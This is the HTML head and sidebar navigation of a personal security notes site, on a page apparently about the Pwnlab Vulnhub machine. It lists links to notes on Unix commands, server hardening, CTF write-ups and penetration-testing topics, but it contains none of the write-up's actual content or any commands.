<!doctype html><html lang=en class="js csstransforms3d"><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=generator content="Hugo 0.69.1"><meta name=description content="Notes from the Pwnlab machine from Vulnhub."><meta name=author content="Justin Perdok"><link rel=icon href=/images/favicon.png type=image/png><title>Pwnlab :: My notes and snippets</title><link href=/css/nucleus.css rel=stylesheet><link href=/css/fontawesome-all.min.css rel=stylesheet><link href=/css/hybrid.css rel=stylesheet><link href=/css/featherlight.min.css rel=stylesheet><link href=/css/perfect-scrollbar.min.css rel=stylesheet><link href=/css/auto-complete.css rel=stylesheet><link href=/css/atom-one-dark-reasonable.css rel=stylesheet><link href=/css/theme.css rel=stylesheet><link href=/css/hugo-theme.css rel=stylesheet><link href=/css/theme-darkblue.css rel=stylesheet><link href=/css/style.css rel=stylesheet><script src=/js/jquery-3.3.1.min.js></script><style>:root #header+#content>#left>#rlblock_left{display:none!important}</style></head><body data-url=/notes/ctfs/vulnhub/pwnlab/><nav id=sidebar><div id=header-wrapper><div id=header><a id=logo href=https://confident-austin-c176a7.netlify.com/></a></div><div class=searchbox><label for=search-by><i class="fas fa-search"></i></label><input data-search-input id=search-by type=search placeholder=Search...>
<span data-search-clear><i class="fas fa-times"></i></span></div><script type=text/javascript src=/js/lunr.min.js></script><script type=text/javascript src=/js/auto-complete.js></script><script type=text/javascript>var baseurl="https:\/\/confident-austin-c176a7.netlify.com\/";</script><script type=text/javascript src=/js/search.js></script></div><div class=highlightable><ul class=topics><li data-nav-id=/commands/ title=Commands class=dd-item><a href=/commands/><i class="fas fa-keyboard"></i>Commands</a><ul><li data-nav-id=/commands/unix/ title=Unix class=dd-item><a href=/commands/unix/><i class="fab fa-linux"></i>Unix</a><ul><li data-nav-id=/commands/unix/awk/ title=awk class=dd-item><a href=/commands/unix/awk/><i class="fas fa-terminal"></i>awk</a></li><li data-nav-id=/commands/unix/base64/ title=base64 class=dd-item><a href=/commands/unix/base64/><i class="fas fa-terminal"></i>base64</a></li><li data-nav-id=/commands/unix/bzip2/ title=bzip2 class=dd-item><a href=/commands/unix/bzip2/><i class="fas fa-terminal"></i>bzip2</a></li><li data-nav-id=/commands/unix/cron/ title=cron class=dd-item><a href=/commands/unix/cron/><i class="fas fa-terminal"></i>cron</a></li><li data-nav-id=/commands/unix/curl/ title=curl class=dd-item><a href=/commands/unix/curl/><i class="fas fa-terminal"></i>curl</a></li><li data-nav-id=/commands/unix/cut/ title=cut class=dd-item><a href=/commands/unix/cut/><i class="fas fa-terminal"></i>cut</a></li><li data-nav-id=/commands/unix/file/ title=file class=dd-item><a href=/commands/unix/file/><i class="fas fa-terminal"></i>file</a></li><li data-nav-id=/commands/unix/find/ title=find class=dd-item><a href=/commands/unix/find/><i class="fas fa-terminal"></i>find</a></li><li data-nav-id=/commands/unix/grep/ title=grep class=dd-item><a href=/commands/unix/grep/><i class="fas fa-terminal"></i>grep</a></li><li data-nav-id=/commands/unix/gzip-gunzip-zcat/ title="gzip gunzip zcat" class=dd-item><a href=/commands/unix/gzip-gunzip-zcat/><i class="fas fa-terminal"></i>gzip gunzip zcat</a></li><li data-nav-id=/commands/unix/md5sum/ title=md5sum class=dd-item><a href=/commands/unix/md5sum/><i class="fas fa-terminal"></i>md5sum</a></li><li data-nav-id=/commands/unix/random/ title=random class=dd-item><a href=/commands/unix/random/><i class="fas fa-terminal"></i>random</a></li><li data-nav-id=/commands/unix/rev/ title=rev class=dd-item><a href=/commands/unix/rev/><i class="fas fa-terminal"></i>rev</a></li><li data-nav-id=/commands/unix/scp/ title=scp class=dd-item><a href=/commands/unix/scp/><i class="fas fa-terminal"></i>scp</a></li><li data-nav-id=/commands/unix/sed/ title=sed class=dd-item><a href=/commands/unix/sed/><i class="fas fa-terminal"></i>sed</a></li><li data-nav-id=/commands/unix/sort/ title=sort class=dd-item><a href=/commands/unix/sort/><i class="fas fa-terminal"></i>sort</a></li><li data-nav-id=/commands/unix/strings/ title=strings class=dd-item><a href=/commands/unix/strings/><i class="fas fa-terminal"></i>strings</a></li><li data-nav-id=/commands/unix/tar/ title=tar class=dd-item><a href=/commands/unix/tar/><i class="fas fa-terminal"></i>tar</a></li><li data-nav-id=/commands/unix/touch/ title=touch class=dd-item><a href=/commands/unix/touch/><i class="fas fa-terminal"></i>touch</a></li><li data-nav-id=/commands/unix/tr/ title=tr class=dd-item><a href=/commands/unix/tr/><i class="fas fa-terminal"></i>tr</a></li><li data-nav-id=/commands/unix/uniq/ title=uniq class=dd-item><a href=/commands/unix/uniq/><i class="fas fa-terminal"></i>uniq</a></li><li data-nav-id=/commands/unix/xxd/ title=xxd class=dd-item><a href=/commands/unix/xxd/><i class="fas fa-terminal"></i>xxd</a></li></ul></li></ul></li><li data-nav-id=/guides/ title=Guides class=dd-item><a href=/guides/><i class="fas fa-arrow-alt-circle-right"></i>Guides</a><ul><li data-nav-id=/guides/ubuntu-vps/ title="Ubuntu VPS" class=dd-item><a href=/guides/ubuntu-vps/><i class="fab fa-ubuntu"></i>Ubuntu VPS</a><ul><li data-nav-id=/guides/ubuntu-vps/00-intro/ title="00. Introduction" class=dd-item><a href=/guides/ubuntu-vps/00-intro/>00. Introduction</a></li><li data-nav-id=/guides/ubuntu-vps/01-users/ title="01. Adding users" class=dd-item><a href=/guides/ubuntu-vps/01-users/>01. Adding users</a></li><li data-nav-id=/guides/ubuntu-vps/02-packges/ title="02. Managing of packages" class=dd-item><a href=/guides/ubuntu-vps/02-packges/>02. Managing of packages</a></li><li data-nav-id=/guides/ubuntu-vps/03-vim/ title="03. File editor: vim" class=dd-item><a href=/guides/ubuntu-vps/03-vim/>03. File editor: vim</a></li><li data-nav-id=/guides/ubuntu-vps/04-ufw/ title="04. UFW" class=dd-item><a href=/guides/ubuntu-vps/04-ufw/>04. UFW</a></li><li data-nav-id=/guides/ubuntu-vps/05-ssh-keys/ title="05. SSH Keys" class=dd-item><a href=/guides/ubuntu-vps/05-ssh-keys/>05. SSH Keys</a></li><li data-nav-id=/guides/ubuntu-vps/06-setup-sshd/ title="06. Setup sshd" class=dd-item><a href=/guides/ubuntu-vps/06-setup-sshd/>06. Setup sshd</a></li><li data-nav-id=/guides/ubuntu-vps/07-unattended-upgrades/ title="07. Unattended Upgrades" class=dd-item><a href=/guides/ubuntu-vps/07-unattended-upgrades/>07. Unattended Upgrades</a></li><li data-nav-id=/guides/ubuntu-vps/08-fail2ban/ title="08. Fail2ban" class=dd-item><a href=/guides/ubuntu-vps/08-fail2ban/>08. Fail2ban</a></li><li data-nav-id=/guides/ubuntu-vps/09-logwatch/ title="09. Logwatch" class=dd-item><a href=/guides/ubuntu-vps/09-logwatch/>09. Logwatch</a></li><li data-nav-id=/guides/ubuntu-vps/10-sysctl-optimization/ title="10. Sysctl Optimization" class=dd-item><a href=/guides/ubuntu-vps/10-sysctl-optimization/>10. Sysctl Optimization</a></li></ul></li></ul></li><li data-nav-id=/notes/ title=Notes class=dd-item><a href=/notes/><i class="fas fa-book-reader"></i>Notes</a><ul><li data-nav-id=/notes/courses/ title=Courses class=dd-item><a href=/notes/courses/><i class="fas fa-school"></i>Courses</a></li><li data-nav-id=/notes/ctfs/ title=CTFs class=dd-item><a href=/notes/ctfs/><i class="fas fa-flag"></i>CTFs</a><ul><li data-nav-id=/notes/ctfs/graficomspoorzoeker/ title="Graficom Spoorzoeker" class=dd-item><a href=/notes/ctfs/graficomspoorzoeker/><i class="fas fa-folder"></i>Graficom Spoorzoeker</a><ul><li data-nav-id=/notes/ctfs/graficomspoorzoeker/challanges/ title=Challanges class=dd-item><a href=/notes/ctfs/graficomspoorzoeker/challanges/><i class="fas fa-question-circle"></i>Challanges</a></li><li data-nav-id=/notes/ctfs/graficomspoorzoeker/solutions/ title=Solutions class=dd-item><a href=/notes/ctfs/graficomspoorzoeker/solutions/><i class="fas fa-check-circle"></i>Solutions</a></li></ul></li><li data-nav-id=/notes/ctfs/htb/ title=HTB class=dd-item><a href=/notes/ctfs/htb/><i class="fas fa-folder"></i>HTB</a><ul><li data-nav-id=/notes/ctfs/htb/bashed/ title=Bashed class=dd-item><a href=/notes/ctfs/htb/bashed/><i class="fas fa-server"></i>Bashed</a></li><li data-nav-id=/notes/ctfs/htb/blue/ title=Blue class=dd-item><a href=/notes/ctfs/htb/blue/><i class="fas fa-server"></i>Blue</a></li><li data-nav-id=/notes/ctfs/htb/devel/ title=Devel class=dd-item><a href=/notes/ctfs/htb/devel/><i class="fas fa-server"></i>Devel</a></li><li data-nav-id=/notes/ctfs/htb/grandpa/ title=Grandpa class=dd-item><a href=/notes/ctfs/htb/grandpa/><i class="fas fa-server"></i>Grandpa</a></li><li data-nav-id=/notes/ctfs/htb/granny/ title=Granny class=dd-item><a href=/notes/ctfs/htb/granny/><i class="fas fa-server"></i>Granny</a></li><li data-nav-id=/notes/ctfs/htb/jerry/ title=Jerry class=dd-item><a href=/notes/ctfs/htb/jerry/><i class="fas fa-server"></i>Jerry</a></li><li data-nav-id=/notes/ctfs/htb/lame/ title=Lame class=dd-item><a href=/notes/ctfs/htb/lame/><i class="fas fa-server"></i>Lame</a></li><li data-nav-id=/notes/ctfs/htb/legacy/ title=Legacy class=dd-item><a href=/notes/ctfs/htb/legacy/><i class="fas fa-server"></i>Legacy</a></li><li data-nav-id=/notes/ctfs/htb/metmon/ title=Netmon class=dd-item><a href=/notes/ctfs/htb/metmon/><i class="fas fa-server"></i>Netmon</a></li><li data-nav-id=/notes/ctfs/htb/nibbles/ title=Nibbles class=dd-item><a href=/notes/ctfs/htb/nibbles/><i class="fas fa-server"></i>Nibbles</a></li><li data-nav-id=/notes/ctfs/htb/optimum/ title=Optimum class=dd-item><a href=/notes/ctfs/htb/optimum/><i class="fas fa-server"></i>Optimum</a></li></ul></li><li data-nav-id=/notes/ctfs/overthewire/ title=OverTheWire class=dd-item><a href=/notes/ctfs/overthewire/><i class="fas fa-folder"></i>OverTheWire</a><ul><li data-nav-id=/notes/ctfs/overthewire/bandit/ title=Bandit class=dd-item><a href=/notes/ctfs/overthewire/bandit/><i class="fas fa-layer-group"></i>Bandit</a></li><li data-nav-id=/notes/ctfs/overthewire/natasa/ title=Natasa class=dd-item><a href=/notes/ctfs/overthewire/natasa/><i class="fas fa-layer-group"></i>Natasa</a></li></ul></li><li data-nav-id=/notes/ctfs/vulnhub/ title=VulnHub class="dd-item
parent"><a href=/notes/ctfs/vulnhub/><i class="fas fa-folder"></i>VulnHub</a><ul><li data-nav-id=/notes/ctfs/vulnhub/fristileaks/ title=Fristileaks class=dd-item><a href=/notes/ctfs/vulnhub/fristileaks/><i class="fas fa-folder"></i>Fristileaks</a></li><li data-nav-id=/notes/ctfs/vulnhub/kioptrix/ title=Kioptrix class=dd-item><a href=/notes/ctfs/vulnhub/kioptrix/><i class="fas fa-folder"></i>Kioptrix</a><ul><li data-nav-id=/notes/ctfs/vulnhub/kioptrix/level1/ title="Level 1" class=dd-item><a href=/notes/ctfs/vulnhub/kioptrix/level1/><i class="fas fa-layer-group"></i>Level 1</a></li><li data-nav-id=/notes/ctfs/vulnhub/kioptrix/level2/ title="Level 2" class=dd-item><a href=/notes/ctfs/vulnhub/kioptrix/level2/><i class="fas fa-layer-group"></i>Level 2</a></li><li data-nav-id=/notes/ctfs/vulnhub/kioptrix/level3/ title="Level 3" class=dd-item><a href=/notes/ctfs/vulnhub/kioptrix/level3/><i class="fas fa-layer-group"></i>Level 3</a></li><li data-nav-id=/notes/ctfs/vulnhub/kioptrix/level4/ title="Level 4" class=dd-item><a href=/notes/ctfs/vulnhub/kioptrix/level4/><i class="fas fa-layer-group"></i>Level 4</a></li></ul></li><li data-nav-id=/notes/ctfs/vulnhub/pwnlab/ title=Pwnlab class="dd-item active"><a href=/notes/ctfs/vulnhub/pwnlab/><i class="fas fa-folder"></i>Pwnlab</a></li><li data-nav-id=/notes/ctfs/vulnhub/stapler/ title=Stapler class=dd-item><a href=/notes/ctfs/vulnhub/stapler/><i class="fas fa-folder"></i>Stapler</a></li><li data-nav-id=/notes/ctfs/vulnhub/vulnix/ title=Vulnix class=dd-item><a href=/notes/ctfs/vulnhub/vulnix/><i class="fas fa-folder"></i>Vulnix</a></li></ul></li><li data-nav-id=/notes/ctfs/vulnserver/ title=Vulnserver class=dd-item><a href=/notes/ctfs/vulnserver/><i class="fas fa-folder"></i>Vulnserver</a><ul><li data-nav-id=/notes/ctfs/vulnserver/trun/ title=TRUN class=dd-item><a href=/notes/ctfs/vulnserver/trun/><i class="fas fa-layer-group"></i>TRUN</a></li></ul></li></ul></li><li data-nav-id=/notes/exploit-development/ title="Exploit Development" class=dd-item><a href=/notes/exploit-development/><i class="fas fa-biohazard"></i>Exploit Development</a><ul><li data-nav-id=/notes/exploit-development/buffer-overflow/ title="Buffer Overflow" class=dd-item><a href=/notes/exploit-development/buffer-overflow/><i class="fas fa-layer-group"></i>Buffer Overflow</a></li></ul></li><li data-nav-id=/notes/todo-hacking-methodology/ title="Hacking Methodology" class=dd-item><a href=/notes/todo-hacking-methodology/><i class="fas fa-road"></i>Hacking Methodology</a><ul><li data-nav-id=/notes/todo-hacking-methodology/01-reconnaissance/ title="01. Reconnaissance" class=dd-item><a href=/notes/todo-hacking-methodology/01-reconnaissance/>01. Reconnaissance</a><ul><li data-nav-id=/notes/todo-hacking-methodology/01-reconnaissance/credential-gathering/ title="Credential Gathering" class=dd-item><a href=/notes/todo-hacking-methodology/01-reconnaissance/credential-gathering/>Credential Gathering</a></li><li data-nav-id=/notes/todo-hacking-methodology/01-reconnaissance/dns-recon/ title="DNS Recon" class=dd-item><a href=/notes/todo-hacking-methodology/01-reconnaissance/dns-recon/>DNS Recon</a></li><li data-nav-id=/notes/todo-hacking-methodology/01-reconnaissance/e-mail-gathering/ title="E-Mail Gathering" class=dd-item><a href=/notes/todo-hacking-methodology/01-reconnaissance/e-mail-gathering/>E-Mail Gathering</a></li><li data-nav-id=/notes/todo-hacking-methodology/01-reconnaissance/google-dorking/ title="Google Dorking" class=dd-item><a href=/notes/todo-hacking-methodology/01-reconnaissance/google-dorking/>Google Dorking</a></li><li data-nav-id=/notes/todo-hacking-methodology/01-reconnaissance/identify-website-technologies/ title="Identify Website Technologies" class=dd-item><a href=/notes/todo-hacking-methodology/01-reconnaissance/identify-website-technologies/>Identify Website Technologies</a></li><li data-nav-id=/notes/todo-hacking-methodology/01-reconnaissance/social-media/ title="Social Media" class=dd-item><a href=/notes/todo-hacking-methodology/01-reconnaissance/social-media/>Social Media</a></li></ul></li><li data-nav-id=/notes/todo-hacking-methodology/02-scanning-and-enumeration/ title="02. Scanning and Enumeration" class=dd-item><a href=/notes/todo-hacking-methodology/02-scanning-and-enumeration/>02. Scanning and Enumeration</a><ul><li data-nav-id=/notes/todo-hacking-methodology/02-scanning-and-enumeration/discover-open-ports/ title="Discover Open Ports" class=dd-item><a href=/notes/todo-hacking-methodology/02-scanning-and-enumeration/discover-open-ports/>Discover Open Ports</a></li><li data-nav-id=/notes/todo-hacking-methodology/02-scanning-and-enumeration/finger/ title=Finger class=dd-item><a href=/notes/todo-hacking-methodology/02-scanning-and-enumeration/finger/>Finger</a></li><li data-nav-id=/notes/todo-hacking-methodology/02-scanning-and-enumeration/nfs/ title=NFS class=dd-item><a href=/notes/todo-hacking-methodology/02-scanning-and-enumeration/nfs/>NFS</a></li><li data-nav-id=/notes/todo-hacking-methodology/02-scanning-and-enumeration/searchsploit/ title=searchsploit class=dd-item><a href=/notes/todo-hacking-methodology/02-scanning-and-enumeration/searchsploit/>searchsploit</a></li><li data-nav-id=/notes/todo-hacking-methodology/02-scanning-and-enumeration/smb/ title=smb class=dd-item><a href=/notes/todo-hacking-methodology/02-scanning-and-enumeration/smb/>smb</a></li><li data-nav-id=/notes/todo-hacking-methodology/02-scanning-and-enumeration/smtp/ title=smtp class=dd-item><a href=/notes/todo-hacking-methodology/02-scanning-and-enumeration/smtp/>smtp</a></li><li data-nav-id=/notes/todo-hacking-methodology/02-scanning-and-enumeration/web/ title=Web class=dd-item><a href=/notes/todo-hacking-methodology/02-scanning-and-enumeration/web/>Web</a></li></ul></li><li data-nav-id=/notes/todo-hacking-methodology/03-exploitation/ title="03. Exploitation" class=dd-item><a href=/notes/todo-hacking-methodology/03-exploitation/>03. Exploitation</a><ul><li data-nav-id=/notes/todo-hacking-methodology/03-exploitation/active-directory/ title="Active Directory" class=dd-item><a href=/notes/todo-hacking-methodology/03-exploitation/active-directory/>Active Directory</a><ul><li data-nav-id=/notes/todo-hacking-methodology/03-exploitation/active-directory/attack-tools/ title="Attack Tools" class=dd-item><a href=/notes/todo-hacking-methodology/03-exploitation/active-directory/attack-tools/>Attack Tools</a><ul><li data-nav-id=/notes/todo-hacking-methodology/03-exploitation/active-directory/attack-tools/mitm6/ title=mitm6 class=dd-item><a href=/notes/todo-hacking-methodology/03-exploitation/active-directory/attack-tools/mitm6/>mitm6</a></li><li data-nav-id=/notes/todo-hacking-methodology/03-exploitation/active-directory/attack-tools/ntlmrelayx/ title=ntlmrelayx class=dd-item><a href=/notes/todo-hacking-methodology/03-exploitation/active-directory/attack-tools/ntlmrelayx/>ntlmrelayx</a></li><li data-nav-id=/notes/todo-hacking-methodology/03-exploitation/active-directory/attack-tools/psexec/ title=psexec class=dd-item><a href=/notes/todo-hacking-methodology/03-exploitation/active-directory/attack-tools/psexec/>psexec</a></li><li data-nav-id=/notes/todo-hacking-methodology/03-exploitation/active-directory/attack-tools/responder/ title=responder class=dd-item><a href=/notes/todo-hacking-methodology/03-exploitation/active-directory/attack-tools/responder/>responder</a></li></ul></li><li data-nav-id=/notes/todo-hacking-methodology/03-exploitation/active-directory/ipv6-dns-takeover/ title="IPv6 DNS Takeover" class=dd-item><a href=/notes/todo-hacking-methodology/03-exploitation/active-directory/ipv6-dns-takeover/>IPv6 DNS Takeover</a></li><li data-nav-id=/notes/todo-hacking-methodology/03-exploitation/active-directory/llmnr-and-nbt-ns/ title="LLMNR and NBT-NS" class=dd-item><a href=/notes/todo-hacking-methodology/03-exploitation/active-directory/llmnr-and-nbt-ns/>LLMNR and NBT-NS</a></li><li data-nav-id=/notes/todo-hacking-methodology/03-exploitation/active-directory/smb-relay/ title="SMB Relay" class=dd-item><a href=/notes/todo-hacking-methodology/03-exploitation/active-directory/smb-relay/>SMB Relay</a></li><li data-nav-id=/notes/todo-hacking-methodology/03-exploitation/active-directory/wpad/ title=WPAD class=dd-item><a href=/notes/todo-hacking-methodology/03-exploitation/active-directory/wpad/>WPAD</a></li></ul></li><li data-nav-id=/notes/todo-hacking-methodology/03-exploitation/brute-forceing/credential-stuffing/ title="Credential Stuffing" class=dd-item><a href=/notes/todo-hacking-methodology/03-exploitation/brute-forceing/credential-stuffing/>Credential Stuffing</a></li><li data-nav-id=/notes/todo-hacking-methodology/03-exploitation/brute-forceing/hydra/ title=Hydra class=dd-item><a href=/notes/todo-hacking-methodology/03-exploitation/brute-forceing/hydra/>Hydra</a></li><li data-nav-id=/notes/todo-hacking-methodology/03-exploitation/brute-forceing/password-spraying/ title="Password Spraying" class=dd-item><a href=/notes/todo-hacking-methodology/03-exploitation/brute-forceing/password-spraying/>Password Spraying</a></li><li data-nav-id=/notes/todo-hacking-methodology/03-exploitation/redis/ title=Redis class=dd-item><a href=/notes/todo-hacking-methodology/03-exploitation/redis/>Redis</a></li><li data-nav-id=/notes/todo-hacking-methodology/03-exploitation/shells/ title=Shells class=dd-item><a href=/notes/todo-hacking-methodology/03-exploitation/shells/>Shells</a><ul><li data-nav-id=/notes/todo-hacking-methodology/03-exploitation/shells/msfvenom/ title=msfvenom class=dd-item><a href=/notes/todo-hacking-methodology/03-exploitation/shells/msfvenom/>msfvenom</a></li><li data-nav-id=/notes/todo-hacking-methodology/03-exploitation/shells/payloads/ title=payloads class=dd-item><a href=/notes/todo-hacking-methodology/03-exploitation/shells/payloads/>payloads</a></li></ul></li><li data-nav-id=/notes/todo-hacking-methodology/03-exploitation/sql-injection/ title="SQL Injection" class=dd-item><a href=/notes/todo-hacking-methodology/03-exploitation/sql-injection/>SQL Injection</a></li></ul></li><li data-nav-id=/notes/todo-hacking-methodology/04-post-exploitation/ title="04. Post Exploitation" class=dd-item><a href=/notes/todo-hacking-methodology/04-post-exploitation/>04. Post Exploitation</a><ul><li data-nav-id=/notes/todo-hacking-methodology/04-post-exploitation/active-directory/ title=activedirectory class=dd-item><a href=/notes/todo-hacking-methodology/04-post-exploitation/active-directory/>activedirectory</a><ul><li data-nav-id=/notes/todo-hacking-methodology/04-post-exploitation/active-directory/credential-access/ title=credentialaccess class=dd-item><a href=/notes/todo-hacking-methodology/04-post-exploitation/active-directory/credential-access/>credentialaccess</a></li><li data-nav-id=/notes/todo-hacking-methodology/04-post-exploitation/active-directory/powerview/ title=powerview class=dd-item><a href=/notes/todo-hacking-methodology/04-post-exploitation/active-directory/powerview/>powerview</a></li></ul></li><li data-nav-id=/notes/todo-hacking-methodology/04-post-exploitation/pdf/encrypted-password-protected-pdf/ title="encrypted password protected pdf" class=dd-item><a href=/notes/todo-hacking-methodology/04-post-exploitation/pdf/encrypted-password-protected-pdf/>encrypted password protected pdf</a></li><li data-nav-id=/notes/todo-hacking-methodology/04-post-exploitation/zip/encrypted-password-protected-zip/ title="encrypted password protected zip" class=dd-item><a href=/notes/todo-hacking-methodology/04-post-exploitation/zip/encrypted-password-protected-zip/>encrypted password protected zip</a></li><li data-nav-id=/notes/todo-hacking-methodology/04-post-exploitation/passwords/hash-identifier/ title="hash identifier" class=dd-item><a href=/notes/todo-hacking-methodology/04-post-exploitation/passwords/hash-identifier/>hash identifier</a></li><li data-nav-id=/notes/todo-hacking-methodology/04-post-exploitation/passwords/hashcat/ title=hashcat class=dd-item><a href=/notes/todo-hacking-methodology/04-post-exploitation/passwords/hashcat/>hashcat</a></li><li data-nav-id=/notes/todo-hacking-methodology/04-post-exploitation/priv-esc/ title="priv esc" class=dd-item><a href=/notes/todo-hacking-methodology/04-post-exploitation/priv-esc/>priv esc</a></li><li data-nav-id=/notes/todo-hacking-methodology/04-post-exploitation/shell-escaping/ title="shell escaping" class=dd-item><a href=/notes/todo-hacking-methodology/04-post-exploitation/shell-escaping/>shell escaping</a></li><li data-nav-id=/notes/todo-hacking-methodology/04-post-exploitation/passwords/unshadow/ title=unshadow class=dd-item><a href=/notes/todo-hacking-methodology/04-post-exploitation/passwords/unshadow/>unshadow</a></li><li data-nav-id=/notes/todo-hacking-methodology/04-post-exploitation/wordpress/wpadmin-plugin-upload/ title="wpadmin plugin upload" class=dd-item><a href=/notes/todo-hacking-methodology/04-post-exploitation/wordpress/wpadmin-plugin-upload/>wpadmin plugin upload</a></li></ul></li><li data-nav-id=/notes/todo-hacking-methodology/05-cleanup/ title="05. Cleanup" class=dd-item><a href=/notes/todo-hacking-methodology/05-cleanup/>05. Cleanup</a></li></ul></li><li data-nav-id=/notes/networking/ title=Networking class=dd-item><a href=/notes/networking/><i class="fas fa-network-wired"></i>Networking</a><ul><li data-nav-id=/notes/networking/osi-model/ title="OSI Model" class=dd-item><a href=/notes/networking/osi-model/><i class="fas fa-ethernet"></i>OSI Model</a><ul><li data-nav-id=/notes/networking/osi-model/layer1/ title="Layer 1" class=dd-item><a href=/notes/networking/osi-model/layer1/><i class="fas fa-ethernet"></i>Layer 1</a></li><li data-nav-id=/notes/networking/osi-model/layer2/ title="Layer 2" class=dd-item><a href=/notes/networking/osi-model/layer2/><i class="fas fa-ethernet"></i>Layer 2</a></li><li data-nav-id=/notes/networking/osi-model/layer3/ title="Layer 3" class=dd-item><a href=/notes/networking/osi-model/layer3/><i class="fas fa-ethernet"></i>Layer 3</a></li><li data-nav-id=/notes/networking/osi-model/layer4/ title="Layer 4" class=dd-item><a href=/notes/networking/osi-model/layer4/><i class="fas fa-ethernet"></i>Layer 4</a></li><li data-nav-id=/notes/networking/osi-model/layer5/ title="Layer 5" class=dd-item><a href=/notes/networking/osi-model/layer5/><i class="fas fa-ethernet"></i>Layer 5</a></li><li data-nav-id=/notes/networking/osi-model/layer6/ title="Layer 6" class=dd-item><a href=/notes/networking/osi-model/layer6/><i class="fas fa-ethernet"></i>Layer 6</a></li><li data-nav-id=/notes/networking/osi-model/layer7/ title="Layer 7" class=dd-item><a href=/notes/networking/osi-model/layer7/><i class="fas fa-ethernet"></i>Layer 7</a></li></ul></li><li data-nav-id=/notes/networking/tcpip-model/ title="TCP/IP Model" class=dd-item><a href=/notes/networking/tcpip-model/><i class="fas fa-ethernet"></i>TCP/IP Model</a></li></ul></li><li data-nav-id=/notes/programming/ title=Programming class=dd-item><a href=/notes/programming/><i class="fas fa-code"></i>Programming</a><ul><li data-nav-id=/notes/programming/bash/ title=Bash class=dd-item><a href=/notes/programming/bash/><i class="fas fa-layer-group"></i>Bash</a></li><li data-nav-id=/notes/programming/docker-compose/ title=Docker-Compose class=dd-item><a href=/notes/programming/docker-compose/><i class="fas fa-layer-group"></i>Docker-Compose</a></li><li data-nav-id=/notes/programming/dockerfile/ title=Dockerfile class=dd-item><a href=/notes/programming/dockerfile/><i class="fas fa-layer-group"></i>Dockerfile</a></li><li data-nav-id=/notes/programming/markdown/ title=Markdown class=dd-item><a href=/notes/programming/markdown/><i class="fas fa-layer-group"></i>Markdown</a></li><li data-nav-id=/notes/programming/mysql/ title=MySQL class=dd-item><a href=/notes/programming/mysql/><i class="fas fa-layer-group"></i>MySQL</a></li><li data-nav-id=/notes/programming/python/ title=Python class=dd-item><a href=/notes/programming/python/><i class="fas fa-layer-group"></i>Python</a></li></ul></li><li data-nav-id=/notes/z_private/ title=Z_Private class=dd-item><a href=/notes/z_private/><i class="fas fa-lock"></i>Private</a></li></ul></li><li data-nav-id=/tools/ title=Tools class=dd-item><a href=/tools/><i class="fas fa-tools"></i>Tools</a><ul><li data-nav-id=/tools/00-forensic/ title=00-Forensic class=dd-item><a href=/tools/00-forensic/><i class="fas fa-folder"></i>Forensic</a><ul><li data-nav-id=/tools/00-forensic/exiftool/ title=exiftool class=dd-item><a href=/tools/00-forensic/exiftool/><i class="fas fa-wrench"></i>exiftool</a></li><li data-nav-id=/tools/00-forensic/ssh-sha256-to-public-key/ title="ssh sha256 to public key" class=dd-item><a href=/tools/00-forensic/ssh-sha256-to-public-key/><i class="fas fa-wrench"></i>ssh sha256 to public key</a></li><li data-nav-id=/tools/00-forensic/usbrip/ title=usbrip class=dd-item><a href=/tools/00-forensic/usbrip/><i class="fas fa-wrench"></i>usbrip</a></li></ul></li><li data-nav-id=/tools/00-frameworks/ title=00-Frameworks class=dd-item><a href=/tools/00-frameworks/><i class="fas fa-folder"></i>Frameworks</a><ul><li data-nav-id=/tools/00-frameworks/empire/ title=empire class=dd-item><a href=/tools/00-frameworks/empire/><i class="fas fa-wrench"></i>empire</a></li><li data-nav-id=/tools/00-frameworks/metasploit/ title=metasploit class=dd-item><a href=/tools/00-frameworks/metasploit/><i class="fas fa-wrench"></i>metasploit</a></li></ul></li><li data-nav-id=/tools/00-steganography/ title=00-Steganography class=dd-item><a href=/tools/00-steganography/><i class="fas fa-folder"></i>Steganography</a><ul><li data-nav-id=/tools/00-steganography/binwalk/ title=binwalk class=dd-item><a href=/tools/00-steganography/binwalk/><i class="fas fa-wrench"></i>binwalk</a></li><li data-nav-id=/tools/00-steganography/foremost/ title=foremost class=dd-item><a href=/tools/00-steganography/foremost/><i class="fas fa-wrench"></i>foremost</a></li><li data-nav-id=/tools/00-steganography/steghide/ title=steghide class=dd-item><a href=/tools/00-steganography/steghide/><i class="fas fa-wrench"></i>steghide</a></li></ul></li><li data-nav-id=/tools/amass/ title=amass class=dd-item><a href=/tools/amass/><i class="fas fa-wrench"></i>amass</a></li><li data-nav-id=/tools/h8mail/ title=h8mail class=dd-item><a href=/tools/h8mail/><i class="fas fa-wrench"></i>h8mail</a></li><li data-nav-id=/tools/nc/ title=nc class=dd-item><a href=/tools/nc/><i class="fas fa-wrench"></i>nc</a></li><li data-nav-id=/tools/nmap/ title=Nmap class=dd-item><a href=/tools/nmap/><i class="fas fa-wrench"></i>Nmap</a></li><li data-nav-id=/tools/openssl/ title=openssl class=dd-item><a href=/tools/openssl/><i class="fas fa-wrench"></i>openssl</a><ul><li data-nav-id=/tools/openssl/s_client/ title=s_client class=dd-item><a href=/tools/openssl/s_client/><i class="fas fa-wrench"></i>s_client</a></li></ul></li><li data-nav-id=/tools/psdnsdumpsterapi/ title=PSDNSDumpsterAPI class=dd-item><a href=/tools/psdnsdumpsterapi/><i class="fas fa-wrench"></i>PSDNSDumpsterAPI</a></li><li data-nav-id=/tools/sublist3r/ title=sublist3r class=dd-item><a href=/tools/sublist3r/><i class="fas fa-wrench"></i>sublist3r</a></li><li data-nav-id=/tools/theharvester/ title=theHarvester class=dd-item><a href=/tools/theharvester/><i class="fas fa-wrench"></i>theHarvester</a></li><li data-nav-id=/tools/tmux/ title=tmux class=dd-item><a href=/tools/tmux/><i class="fas fa-wrench"></i>tmux</a></li><li data-nav-id=/tools/whatweb/ title=whatweb class=dd-item><a href=/tools/whatweb/><i class="fas fa-wrench"></i>whatweb</a></li></ul></li></ul><section id=shortcuts><h3>More</h3><ul><li><a class=padding href=https://github.com/justin-p/><i class="fab fa-github"></i>Github</a></li><li><a class=padding href=https://justin-p.me/><i class="fas fa-kiss-wink-heart"></i>Blog</a></li><li><a class=padding href=https://twitter.com/JustinPerdok><i class="fab fa-twitter"></i>Twitter</a></li><li><a class=padding href=https://www.linkedin.com/in/justinperdok/><i class="fab fa-linkedin-in"></i>LinkedIn</a></li></ul></section><section id=footer><p>Built with
<a href=https://github.com/matcornic/hugo-theme-learn>Hugo Learn</a>
and
